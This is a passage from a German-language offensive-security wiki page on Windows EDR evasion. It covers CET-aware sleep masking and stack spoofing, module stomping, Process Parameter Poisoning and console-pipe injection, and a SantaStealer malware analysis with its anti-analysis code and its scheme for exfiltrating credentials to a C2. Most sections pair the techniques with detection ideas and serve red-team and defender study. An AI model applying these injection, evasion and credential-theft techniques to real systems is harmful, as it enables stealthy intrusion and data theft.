Ein vollständiger `CONTEXT`-Austausch ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, weil ein gefälschter `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster sieht so aus:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess aus und lies dessen Stack-Grenzen aus `NT_TIB`/TEB (`StackBase`, `StackLimit`) über `NtQueryInformationThread` aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse mit `GetThreadContext` den echten schlafenden Kontext.
- Kopiere **nur** den echten `Rip` in den Spoof-Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Zeitfensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs auflösen.
- Stelle nach Ende des Waits den ursprünglichen TIB und Thread-Kontext wieder her.

So bleibt der Instruction Pointer mit CET konsistent, während EDR-Stack-Walker getäuscht werden, die den TEB-Stack-Metadaten zur Validierung von Unwinds vertrauen.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu stark signaturbasiert ist, kann dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz über queued APCs von einem suspendierten Helper-Thread ausgeführt werden:<sup>[[27]](#references)</sup>

- Erstelle einen Helper-Thread mit `NtTestAlert` als Entry Point.
- Queue vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` und arbeite sie mit `NtAlertResumeThread` ab.
- Speichere den Chain-Zustand auf dem Heap statt auf dem Stack des Helper-Threads, um ein Überlaufen des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Suspendiere den Main-Thread vor dem Wiederherstellen des TIB/Kontexts (`NtSuspendThread` → Wiederherstellung → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Helper-Thread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Detection-Ideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- Auf `NtQueryInformationThread` folgen direkte Schreibvorgänge in die Stack-Grenzen des TEB/TIB des aktuellen Threads.
- Chains aus `NtQueueApcThread`/`NtAlertResumeThread`, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Abschnittsberechtigungen aufrufen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Präzises Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer DLL aus, die bereits im Zielprozess gemappt ist**, statt offensichtlichen privaten ausführbaren Speicher zuzuweisen oder eine neue sacrificial DLL zu laden. Das Überschreibungsziel sollte ein **geladenes, dateigestütztes Image** sein, dessen Code-Speicher die Payload aufnehmen kann, ohne Codepfade zu beschädigen, die der Prozess noch benötigt.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gegen gängige Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Code-Bereich kann den Prozess zum Absturz bringen. Ein zuverlässigerer Ablauf ist:

1. Ermittle die Module des Zielprozesses und behalte eine **Include-Liste mit ausschließlich Namen** der bereits geladenen DLLs bei.
2. Baue zuerst die Payload und notiere ihre **exakte Byte-Größe**.
3. Durchsuche Kandidaten-DLLs auf der Festplatte und vergleiche `Misc_VirtualSize` des PE-Abschnitts **`.text`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da dieser Wert die Größe des ausführbaren Abschnitts **im gemappten Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle eine RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Wirkungsbereich**: Wenn die Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt sie benachbarte Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Helper aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Betriebshinweise
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden. Andernfalls können normale Codepfade die überschriebenen Bytes vor oder nach der Thread-Erstellung ausführen.
- Bei großen Implants muss das Einbetten des Shellcodes oft von einem Stringliteral auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der vollständige Puffer im Quellcode des Injectors korrekt dargestellt wird.

Erkennungsideen
- Remote-Schreibvorgänge in ausführbare, durch Images gestützte Speicherseiten (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die üblicheren privaten RWX-/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Arbeitsspeicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige Abfolgen von `VirtualProtect(Ex)` / `WriteProcessMemory` auf DLL-`.text`-Seiten, gefolgt von einer Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion-Technik**, die den klassischen Remote-Write-Pfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Statt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den untergeordneten Prozess kopiert** und in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierte manipulierbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Zeichenfolgen sein, auf die ein zusätzliches `\0` folgt.
- `lpReserved` ist offiziell reserviert. Die Zuordnung zu `ShellInfo` sollte daher als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag behandelt werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitiv**. Der Operator erstellt den untergeordneten Prozess mit vom Angreifer kontrollierten Startdaten und überlässt Windows das prozessübergreifende Kopieren.

### Remote-Suchablauf ohne Remote-Write-APIs

Nachdem der untergeordnete Prozess erstellt wurde, wird der kopierte Puffer mit **schreibgeschützten** Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Zeiger verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Der kopierte Parameterbereich ist normalerweise `RW`, nicht ausführbar. Eine gängige P3-Kette sieht so aus:

1. Prozess normal erstellen (nicht angehalten)
2. Die gewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den Handle des Hauptthreads wiederverwenden, der bereits in `PROCESS_INFORMATION` zurückgegeben wurde
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Im Gegensatz zu klassischen Thread-Hijacking-Workflows sind hierfür **weder `SuspendThread` noch `ResumeThread` erforderlich**; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- oft auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Null-Bytes und gestaffelter Shellcode

Alle drei Träger bestehen aus **String- oder stringähnlichen Daten**, daher wird eine rohe Payload mit `0x00` bei der Übertragung abgeschnitten. Eine praktische Abhilfe ist eine **nullfreie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This ermöglicht es der ersten Stufe, Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader für eine zweite Stufe zu erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Puffer auf den Stack des Ziels legen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Anschließend kann eine zweite Stufe vom Stack in eine `PAGE_READWRITE`-Speicherzuweisung kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden. So wird eine direkte RWX-Speicherzuweisung vermieden.

### Erkennungsideen

Gute Hunting-Möglichkeiten, die von den Autoren genannt werden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **Prozessparameter-Seiten ausführbar** machen
- dieser Schutzänderung folgende Aufrufe von `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und danach auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange oder entropiereiche Werte in `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Transfer-Trick**, aber für sich genommen keine vollständige Ausführungsprimitive: Der kopierte Parameter benötigt weiterhin eine Änderung der Ausführungsberechtigung und eine Methode zur Umleitung der Ausführung.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, da es intern verdächtige Primitives wie `NtWriteVirtualMemory` und `NtCreateThreadEx` verwendet.

## Console-STDIN-Pipe-Injection

Ein interaktiver Console-Prozess kann ebenfalls als **Payload-Transfer-Primitive** verwendet werden. Der Injector leitet die Standardeingabe des Child-Prozesses auf eine Pipe um und sendet einen Marker gefolgt von Shellcode. Nachdem das Console-Programm die Daten in seinen eigenen privaten Speicher eingelesen hat, findet der Injector diesen Puffer, macht ihn ausführbar und leitet einen Thread des Child-Prozesses dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden, es handelt sich aber weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named-pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten, aber der PoC wählt weder einen `\\.\pipe\<name>`-Pfad aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem Standard-Sicherheitsdeskriptor, legt das Lese-Handle in `STARTUPINFO.hStdInput` ab, setzt `STARTF_USESTDHANDLES` und startet einen neuen Child-Prozess mit aktivierter Handle-Vererbung. Daher startet dieser PoC die angegebene Console-Datei; er verbindet seine Pipe nicht mit einem bestehenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenz-Workflow

Die Implementierung verwendet die folgende Kette:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Child-Prozesses erstellen. Die Vererbung der beiden Handles auf der Parent-Seite deaktivieren und nach der Prozesserstellung die Duplikate auf der Child-Seite im Parent schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Der Child-Prozess erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre `rawData`-Array mit `WriteFile` über das `STDIN`-Handle auf der Parent-Seite senden. Das Console-Programm verarbeitet die Bytes und hinterlässt eine Kopie in einem seiner privaten, committeten Speicherbereiche.
4. Den Adressraum des Child-Prozesses mit `VirtualQueryEx` durchlaufen, mögliche `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` auslesen und nach dem Marker am Anfang von `rawData` suchen.
5. Den gefundenen Puffer mit `VirtualProtectEx` auf `PAGE_EXECUTE_READWRITE` setzen.
6. Den Hauptthread identifizieren, anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und ihn fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist x64-spezifisch: Sie ändert `CONTEXT.Rip`, und ihr eingebetteter Payload besteht aus x64-Shellcode. `rawData` beginnt mit einem 25 Byte langen Marker, daher beginnen die ausführbaren Bytes beim hexadezimalen Offset `0x19`. Beim Ersetzen des Payloads muss dieses Layout beibehalten oder Marker, Suchvektor, Array-Größe und Ausführungs-Offset gemeinsam aktualisiert werden. In den Quellkommentaren werden außerdem `0x0A`, `0x0D` und `0x1A` als Bad Characters aufgeführt. Dieser Workflow ändert weder das Token noch die Berechtigungen des untergeordneten Prozesses.<sup>[[41]](#references)</sup>

Beispiele für kleine native Hilfsprogramme und Payload-Kompilierungsmuster finden Sie unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## SantaStealer-Techniken für dateilose Umgehung und den Diebstahl von Zugangsdaten

SantaStealer (auch bekannt als BluelineStealer) zeigt, wie moderne Info-Stealer AV bypass, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Erkennung anhand des Tastaturlayouts und Sandbox-Verzögerung

- Ein Konfigurationsflag (`anti_cis`) listet über `GetKeyboardLayoutList` die installierten Tastaturlayouts auf. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker an und beendet sich, bevor es Stealer ausführt. So wird sichergestellt, dass es in ausgeschlossenen Regionen nicht detoniert, während ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mehrschichtige `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht sie mit eingebetteten Blocklisten für Debugger/Sandboxes. Anschließend wiederholt sie die Prüfsumme für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kürzliche Systemlaufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Sleeps aus, um Einzelschritte zu erkennen. Bei jedem Treffer wird der Ablauf abgebrochen, bevor Module gestartet werden.

### Fileless-Helfer + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE bettet einen Chromium-Anmeldeinformations-Helfer ein, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird. Im Fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helfer-Artefakte geschrieben werden.
- Dieser Helfer speichert eine zweite DLL-Stufe, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (kein `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) stammen.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing mit Direct Syscalls, um sich in einen aktiven Chromium-Browser einzuschleusen, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten direkt aus SQLite-Datenbanken zu entschlüsseln – trotz der ABE-Härtung.

### Modulare Sammlung im Speicher & HTTP-Exfiltration in Chunks

- `create_memory_based_log` durchläuft eine globale Funktionzeiger-Tabelle `memory_generators` und startet für jedes aktivierte Modul einen Thread (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.). Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Puffer und meldet nach einer Join-Zeit von etwa 45 Sekunden die Anzahl seiner Dateien.
- Nach Abschluss wird alles mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet dann 15 Sekunden und streamt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`; dabei wird eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, und an den letzten Chunk wird `complete: true` angehängt, damit der C2 weiß, dass die Zusammensetzung abgeschlossen ist.

## References

- [1] [Fortgeschrittene Evasion-Techniken: präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call Stacks: keine Freifahrtscheine mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC zum Spoofing von Call Stacks](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung für DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollten Sie Ihrem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in frühere Ransomware-Aktivitäten von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) entgegenwirken](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum Befehl mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ehrgeiziger Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung von Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing überwinden](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Dornröschen: Adaptix mit Crystal Palace zur Ruhe legen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftung von Prozessparametern](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Dornröschen II: CFG, CET und Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet ETW verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Missbrauch von Chrome Remote Desktop bei Red-Team-Einsätzen: Ein praktischer Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Den Remediation-Treiber von Defender als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Selbstmaskierende Funktionen mit LLVM erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-Quellcode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-Funktion](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Erstellen eines untergeordneten Prozesses mit umgeleiteter Ein- und Ausgabe](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
